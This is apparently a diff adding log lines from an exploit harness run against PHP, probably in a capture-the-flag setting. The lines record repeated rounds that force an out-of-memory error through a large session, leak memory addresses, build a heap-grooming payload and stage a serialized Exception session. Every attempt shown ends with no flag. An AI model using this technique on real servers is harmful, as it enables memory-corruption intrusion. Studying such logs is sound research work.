@@ -309,3 +309,71 @@
 [2026-10-22 01:28:23] SIG-HIT: 0xf0ef86267018 ([anon:zend_alloc]) chunkrel=0xf0ef86267018
 [2026-10-22 01:28:23] SIG-HIT: 0xf0ef8626f018 ([anon:zend_alloc]) chunkrel=0xf0ef8626f018
 [2026-10-22 01:28:23] SIG-HIT: 0xf0ef89810123 (anon) chunkrel=0xf0ef89810123
+[2026-10-22 01:34:29] === round w6: cpid=3034057 bias=0xfee7647a0000 basic_globals=0xfee7656be748
+[2026-10-22 01:34:29] baseline read: 5 children [19, 20, 21, 22, 23]
+[2026-10-22 01:34:29] staged producer session sess_a013429aaaaaaaaaaaaaaaaaaaaaaaaa (72MB) + consumer sid ready
+[2026-10-22 01:34:29] producer: t=0.1s oom_signature=True len=553
+[2026-10-22 01:34:29] producer body: <br /> <b>Fatal error</b>:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 72000032 bytes) in <b>Unknown</b> on line <b>0</b><br /> <br /> <b>Warning</b>:  PHP Request Startup: Fa
+[2026-10-22 01:34:29] ORACLE cand: pid=19 off=816 data=0xfee762665000 level=1
+[2026-10-22 01:34:29] ORACLE: child=19 &BG(unserialize).data=0xfee7656bea78 d_chunk=0xfee762665000
+[2026-10-22 01:34:29] groom payload built: 8192B, LG=0xfee762666000
+[2026-10-22 01:34:29] staged consumer session sess_b013429bbbbbbbbbbbbbbbbbbbbbbbbb: poc|O:9:Exception:0:{}
+[2026-10-22 01:34:29] consumer: t=0.4s len=6 FLAG=no
+[2026-10-22 01:34:29] consumer body:  <EOF>
+[2026-10-22 01:35:19] kids(host,ns): [(3034825, 19), (3034826, 20), (3034827, 21), (3034828, 22), (3034829, 23)]
+[2026-10-22 01:35:19] pinned child ns=19 host=3034825; stopped [3034826, 3034827, 3034828, 3034829]
+[2026-10-22 01:35:21] producer: t=0.1s oom=True len=553
+[2026-10-22 01:35:21] dbg oracle cand off=816 data=0xe97bf2c65000 level=1
+[2026-10-22 01:35:21] oracle: &BG(unserialize).data=0xe97bf5ccea78 d=0xe97bf2c65000 bias=0xe97bf4db0000
+[2026-10-22 01:35:21] consumer: t=0.3s len=6 FLAG=None
+[2026-10-22 01:35:21] cleanup: SIGCONT sent
+[2026-10-22 01:37:50] kids(host,ns): [(3035928, 19), (3035929, 20), (3035930, 21), (3035931, 22), (3035932, 23)]
+[2026-10-22 01:37:50] pinned child ns=19 host=3035928; stopped [3035929, 3035930, 3035931, 3035932]
+[2026-10-22 01:37:51] producer: t=0.1s oom=True len=553
+[2026-10-22 01:37:51] dbg oracle cand off=816 data=0xfad5f8c65000 level=1
+[2026-10-22 01:37:51] oracle: &BG(unserialize).data=0xfad5fbc1ea78 d=0xfad5f8c65000 bias=0xfad5fad00000
+[2026-10-22 01:37:52] consumer: t=0.2s len=6 FLAG=None
+[2026-10-22 01:37:52] cleanup: SIGCONT sent
+[2026-10-22 01:39:29] === round w7: cpid=3036755 bias=0xf09f5fe00000 basic_globals=0xf09f60d1e748
+[2026-10-22 01:39:29] baseline read: 5 children [19, 20, 21, 22, 23]
+[2026-10-22 01:39:29] staged producer session sess_a013929aaaaaaaaaaaaaaaaaaaaaaaaa (72MB) + consumer sid ready
+[2026-10-22 01:39:29] producer: t=0.1s oom_signature=True len=553
+[2026-10-22 01:39:29] producer body: <br /> <b>Fatal error</b>:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 72000032 bytes) in <b>Unknown</b> on line <b>0</b><br /> <br /> <b>Warning</b>:  PHP Request Startup: Fa
+[2026-10-22 01:39:29] ORACLE cand: pid=20 off=816 data=0xf09f5dc65000 level=1
+[2026-10-22 01:39:29] ORACLE: child=20 &BG(unserialize).data=0xf09f60d1ea78 d_chunk=0xf09f5dc65000
+[2026-10-22 01:39:29] groom payload built: 8192B, LG=0xf09f5dc66000
+[2026-10-22 01:39:29] staged consumer session sess_b013929bbbbbbbbbbbbbbbbbbbbbbbbb: poc|O:9:Exception:0:{}
+[2026-10-22 01:39:29] consumer: t=0.2s len=6 FLAG=no
+[2026-10-22 01:39:29] consumer body:  <EOF>
+[2026-10-22 01:39:33] kids(host,ns): [(3036854, 19), (3036856, 21), (3036857, 22), (3036858, 23), (3037033, 49)]
+[2026-10-22 01:39:33] pinned child ns=19 host=3036854; stopped [3036856, 3036857, 3036858, 3037033]
+[2026-10-22 01:39:35] producer: t=0.1s oom=True len=553
+[2026-10-22 01:39:35] dbg oracle cand off=816 data=0xf09f5dc65000 level=1
+[2026-10-22 01:39:35] oracle: &BG(unserialize).data=0xf09f60d1ea78 d=0xf09f5dc65000 bias=0xf09f5fe00000
+[2026-10-22 01:39:36] consumer: t=0.3s len=6 FLAG=None
+[2026-10-22 01:39:36] cleanup: SIGCONT sent
+[2026-10-22 01:39:57] kids(host,ns): [(3037526, 19), (3037527, 20), (3037528, 21), (3037529, 22), (3037530, 23)]
+[2026-10-22 01:39:57] pinned child ns=19 host=3037526; stopped [3037527, 3037528, 3037529, 3037530]
+[2026-10-22 01:39:59] producer: t=0.1s oom=True len=553
+[2026-10-22 01:39:59] dbg oracle cand off=816 data=0xfbf0b9665000 level=1
+[2026-10-22 01:39:59] oracle: &BG(unserialize).data=0xfbf0bc5eea78 d=0xfbf0b9665000 bias=0xfbf0bb6d0000
+[2026-10-22 01:39:59] consumer: t=0.2s len=6 FLAG=None
+[2026-10-22 01:39:59] cleanup: SIGCONT sent
+[2026-10-22 01:41:41] === round w8: cpid=3038830 bias=0xe6b469bb0000 basic_globals=0xe6b46aace748
+[2026-10-22 01:41:41] baseline read: 5 children [19, 20, 21, 22, 23]
+[2026-10-22 01:41:41] staged producer session sess_a014141aaaaaaaaaaaaaaaaaaaaaaaaa (72MB) + consumer sid ready
+[2026-10-22 01:41:41] producer: t=0.1s oom_signature=True len=553
+[2026-10-22 01:41:41] producer body: <br /> <b>Fatal error</b>:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 72000032 bytes) in <b>Unknown</b> on line <b>0</b><br /> <br /> <b>Warning</b>:  PHP Request Startup: Fa
+[2026-10-22 01:41:41] ORACLE cand: pid=20 off=816 data=0xe6b467a65000 level=1
+[2026-10-22 01:41:41] ORACLE: child=20 &BG(unserialize).data=0xe6b46aacea78 d_chunk=0xe6b467a65000
+[2026-10-22 01:41:41] groom payload built: 8192B, LG=0xe6b467a66000
+[2026-10-22 01:41:41] staged consumer session sess_b014141bbbbbbbbbbbbbbbbbbbbbbbbb: poc|O:9:Exception:0:{}
+[2026-10-22 01:41:42] consumer: t=0.3s len=6 FLAG=no
+[2026-10-22 01:41:42] consumer body:  <EOF>
+[2026-10-22 01:41:48] kids(host,ns): [(3038927, 19), (3038929, 21), (3038930, 22), (3038931, 23), (3039070, 49)]
+[2026-10-22 01:41:48] pinned child ns=19 host=3038927; stopped [3038929, 3038930, 3038931, 3039070]
+[2026-10-22 01:41:50] producer: t=0.1s oom=True len=553
+[2026-10-22 01:41:50] dbg oracle cand off=816 data=0xe6b467a65000 level=1
+[2026-10-22 01:41:50] oracle: &BG(unserialize).data=0xe6b46aacea78 d=0xe6b467a65000 bias=0xe6b469bb0000
+[2026-10-22 01:41:50] consumer: t=0.3s len=6 FLAG=None
+[2026-10-22 01:41:50] cleanup: SIGCONT sent
